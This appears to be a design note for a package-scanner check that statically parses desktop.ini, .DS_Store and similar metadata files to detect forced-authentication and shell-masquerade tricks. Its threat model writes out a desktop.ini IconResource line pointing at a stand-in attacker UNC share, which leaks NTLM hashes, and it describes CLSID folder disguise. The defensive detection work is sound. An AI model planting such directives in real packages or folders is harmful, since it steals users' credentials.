# VC-013 — Metadata surface (design note)

Status: **proposal**. Not yet a decision. If adopted, lands as `D-154` in
[DECISIONS.md](DECISIONS.md) and a new check `internal/check/builtin/vc013_metadata.go`.

**Prototype landed** (analyzer half only, no check/ecosystem wiring): the static
analyzer and `desktop.ini` parser described in §5 exist as
`internal/installsurface/metadata.go` (`AnalyzeMetadataSurface`, `IsMetadataFile`)
with a table-driven corpus in `metadata_test.go` covering the forced-auth,
CLSID, bundled-exe, and benign-system-icon paths. What is NOT yet built: the
VC-013 check (§7), the `-target-host` config (§6), and per-ecosystem enumeration
(§8).

---

## 1. One line

Host-interpreted metadata files that ship inside a package (`desktop.ini`,
`.DS_Store`, `Thumbs.db`, AppleDouble `._*`, NTFS ADS) are a **latent trigger
surface** the tool does not currently assess. Assess them the way we already
assess install hooks — parse statically, classify capability, grade on content —
but with severity that is a function of `(file, host-that-interprets-it)`.

## 2. The gap this closes

depSNORT's install-surface model (D-02, D-04) enumerates a fixed **trigger
taxonomy**:

| Trigger | Fires when | Modelled by |
|---|---|---|
| lifecycle hook (`postinstall`, `install.ps1`) | package manager installs | VC-002 family |
| MSBuild `.targets`/`.props` | project builds | VC-002 / nuget |
| `build.rs`, gemspec body | crate/gem builds | D-149, D-150 |

Every entry shares one shape: **the package's own declared bytes run at a
package-tooling lifecycle event.** The taxonomy has no entry for a different,
equally real activation model:

> **The OS shell interprets a metadata file when a human merely opens the
> directory the package was unpacked into.**

That event — folder view in Explorer / Finder — is not a package-manager
lifecycle event, so nothing in VC-002 reaches it. It is nonetheless a trigger,
and for `desktop.ini` a directly weaponizable one (§4).

## 3. The precise class: host-interpreted metadata

Not "junk," not "packaging hygiene," not "extraneous files." The exact class is
**metadata whose semantics are assigned by the consuming environment, not by the
artifact.** Membership, all sharing that defining property:

| Metadata | Interpreter | Activation event | Latent effect |
|---|---|---|---|
| `desktop.ini` | Windows Explorer | folder view | `IconResource` UNC → forced NTLM auth; `CLSID` → shell redirect/masquerade |
| `.DS_Store` | macOS Finder | folder view | directory-listing disclosure; parser surface |
| `Thumbs.db` / `ehthumbs.db` | Windows shell thumbnail cache | folder view | thumbnail disclosure (incl. of since-deleted files); parser surface |
| `._*` (AppleDouble) / `__MACOSX/` | macOS extraction | unarchive | resource-fork / xattr carriers, quarantine-flag stripping |
| NTFS ADS (`name:stream`) | NTFS | file access | hidden alternate content |

The defining property is also the operationally important one:

> **The same bytes are inert on one host and active on another.**

A `desktop.ini` is dead on Linux and a shell-parsed trigger in Explorer. This is
why metadata cannot be graded by the package's declared intent the way an install
hook is (D-04's "detect presence + indirection"). It must be graded **against
each host that will interpret it** — see §6.

## 4. Threat model — `desktop.ini` (the load-bearing member)

The others are disclosure/parser-surface (informational). `desktop.ini` is the
one with an active-directive path, so it drives the design.

- **Forced authentication / NTLM leak.** A folder's `desktop.ini` with
  `IconResource=\\attacker.example\share\x.ico,0` (or legacy `IconFile=`) causes
  Explorer, on rendering the folder, to fetch that UNC resource over SMB —
  triggering outbound NTLM authentication and leaking the account's hash. No
  click beyond browsing. Same primitive family as `.scf` / `.url` /
  `.library-ms` hash-leak files. **This is the metadata analog of VC-002d** (the
  D-11 block-class signature: network egress + named credential reach), and the
  strongest argument that metadata is an execution-adjacent surface, not hygiene.
- **Shell redirection / masquerade.** `[.ShellClassInfo]` with `CLSID={…}`
  turns a folder into a shell namespace object — opens as a control-panel view,
  hides real contents, or (with a folder named `x.{CLSID}`) conceals the true
  extension. Local social-engineering primitive.
- **Icon-based social engineering.** `IconResource` pointing at a bundled
  `.dll`/`.exe` to dress a malicious folder as something trusted.

Bare `desktop.ini` with no active directive is the common case — a leftover from
a careless drag-from-desktop publish. That is informational (provenance), **not**
an alarm. The value of the check is entirely in **parsing** to tell those apart.

## 5. Design principle: parse, don't detect

Presence-alarming on these names is noise (D-06's false-positive discipline —
the warning tax that gets a tool muted). Instead, reuse the exact pattern of
`AnalyzeDotNet` / `AnalyzeMSBuild`: statically read the bytes, extract directives,
emit a `Surface` of `Hook`s with `Caps`/`Sinks`. Zero execution (D-04) — we read
the INI/binary structure; we never let the shell interpret it. Detecting the
directive *is* the finding.

New analyzer, mirroring the existing ones:

```go
// internal/installsurface/metadata.go
//
// AnalyzeMetadataSurface classifies host-interpreted metadata files shipped in a
// package. Like AnalyzeDotNet/AnalyzeMSBuild it reads statically and returns a
// Surface; unlike them, a finding's severity depends on the interpreting host
// (see check.Config.TargetHosts), so the analyzer records the host-independent
// FACTS (which directive, which UNC/CLSID) and leaves severity to VC-013.
func AnalyzeMetadataSurface(files map[string]string) Surface
```

`desktop.ini` directive grammar to parse (INI sections/keys):

| Section / key | Fact recorded | Capability |
|---|---|---|
| `[.ShellClassInfo] IconResource=` / `IconFile=` with UNC (`\\host\…`) or remote | forced-auth sink, remote `Artifact` | `CapNetwork` + `CapCredentials` |
| `[.ShellClassInfo] IconResource=`/`IconFile=` → bundled `.dll`/`.exe` | local exec reference | `CapExec` |
| `[.ShellClassInfo] CLSID=` | shell redirection | `CapExec` (low confidence) |
| any other key, or no directive | bare presence | none — provenance note only |

The UNC → `CapNetwork`+`CapCredentials` mapping reuses `credentialMarkers` /
`networkMarkers` machinery already in [analyze.go](../internal/installsurface/analyze.go);
a `\\host\share` target is added as a `Sink{Name: "SMB/NTLM", …}` and an
`Artifact{Ref: unc, Remote: true}`. `.DS_Store` / `Thumbs.db` parse to no
capability — they emit a bare disclosure `Hook` and nothing more.

## 6. Host-relative severity — the piece no other check needs

Because metadata semantics live in the consumer, the verdict is
`f(file, host)`. The same `desktop.ini` is:

- **Linux/container deployment target** → informational disclosure (the file
  will never be interpreted; its only signal is provenance).
- **Windows developer workstations** consuming the package → the `IconResource`
  UNC is a live credential-leak sink.

So VC-013 needs a target-host notion the other checks lack. Proposed:

```go
// check.Config
TargetHosts []string // e.g. {"windows","macos","linux"}; empty ⇒ assume all
```

surfaced as `-target-host` (repeatable), defaulting to "all" so a directive is
never silently downgraded. Severity table, host-parameterized:

| Finding | host interprets it | host does not |
|---|---|---|
| `desktop.ini` UNC `IconResource` | **high** (network+credential sink) | low (disclosure) |
| `desktop.ini` `CLSID` redirect | medium | info |
| `desktop.ini` bare / other key | info (provenance) | info |
| `.DS_Store` / `Thumbs.db` present | info (disclosure) | info |
| `._*` / `__MACOSX/` present | info | info |

## 7. Check spec

```go
func (MetadataSurface) Meta() check.Meta {
    return check.Meta{
        ID:              "VC-013",
        Axis:            finding.AxisHygiene, // provenance/how-it-was-assembled…
        DefaultSeverity: finding.SevInfo,
        DefaultGate:     finding.GateAdvisory, // D-06: advisory by default
    }
}
```

- **Axis.** `AxisHygiene` fits the common (bare/disclosure) case cleanly. **Open
  decision:** does an active directive (UNC forced-auth) deserve promotion *out*
  of hygiene — its own gate-eligible treatment, exactly as D-11 promoted VC-002d
  from advisory to block? Recommendation: yes, gate-eligible (not block — it is
  still a heuristic, not set-membership), only when the host interprets it AND the
  directive carries a remote/UNC target.
- **Gate.** `GateAdvisory` default (D-06 high-recall report / high-precision
  gate). Escalates to `GateEligible` only for the active-directive + interpreting-
  host intersection above.
- **Confidence.** High for a parsed UNC directive (deterministic byte pattern);
  low for bare presence.

## 8. Per-ecosystem enumeration cost

The check needs the package's file *tree*, not just its manifest. Current state:

| Ecosystem | Walks file tree today? | Added cost |
|---|---|---|
| nuget | yes — `scanMSBuildDirs` `ReadDir`s the extracted cache dir | a sibling **bounded** metadata walk (metadata appears at arbitrary depth, so it is a new recursive-but-bounded pass, not a fixed-dir check) |
| npm / pypi / rubygems / cargo / gomod | no — read manifest + named hook files via `FileReader` | a new shallow bounded tree enumeration pass |

Any enumeration bound that stops short of the tree end must be disclosed as a
`GapTruncated` coverage gap (D-138, D-142) — a metadata check that silently
capped its walk would report "clean" where it meant "did not finish looking."
The `Surface.Truncated` field already carries exactly this.

## 9. Alignment with existing decisions

- **D-04 zero-execution:** we parse INI/binary structure statically; the shell
  never interprets the file. Detecting the directive is the finding. ✅
- **D-02 dual-tree:** a metadata trigger is an undeclared, host-fired surface —
  the same "undeclared manifest" logic that justified graphing hooks. Findings
  attach to the owning package node (or the metadata artifact node). ✅
- **D-06 advisory-never-gates / false-positive discipline:** parse-don't-detect
  keeps bare leftovers at `info`; only a parsed active directive on an
  interpreting host can reach the gate. ✅
- **D-11 precedent:** the UNC-`IconResource` case is the metadata twin of the one
  heuristic already promoted past advisory. Same reasoning, same bar. ✅

## 10. Open decisions (for the D-154 entry)

1. **Axis of the active case** — keep everything in `AxisHygiene`, or split the
   forced-auth directive into a gate-eligible finding (recommend: split).
2. **`-target-host` default** — "all" (never downgrade) vs. inferred from the
   scan (e.g. lockfile OS markers). Recommend "all", explicit override.
3. **Enumeration scope** — full bounded tree walk vs. top-N-depth. Recommend
   bounded full walk with `Truncated` disclosure, consistent with D-142.
4. **NTFS ADS / AppleDouble** — in v1 or deferred? They need archive-format
   awareness (ADS survives only some transports). Recommend: `desktop.ini` +
   `.DS_Store` + `Thumbs.db` in v1; AppleDouble/`__MACOSX`/ADS as a follow-up.

## 11. Proposed decision-log stub

> **D-154 — metadata surface (VC-013).** Host-interpreted metadata
> (`desktop.ini`, `.DS_Store`, `Thumbs.db`, …) is a trigger surface distinct from
> the package-lifecycle triggers of VC-002: it fires when the OS shell renders
> the unpacked directory, not when a package manager installs. Assessed by a new
> static analyzer (`AnalyzeMetadataSurface`) under D-04, with severity a function
> of `(file, target host)` — the first check whose verdict is host-relative,
> requiring `-target-host`. `desktop.ini` `IconResource` UNC directives are the
> metadata analog of the D-11 VC-002d forced-auth signature and are the sole
> gate-eligible case; all other metadata is advisory/informational provenance.
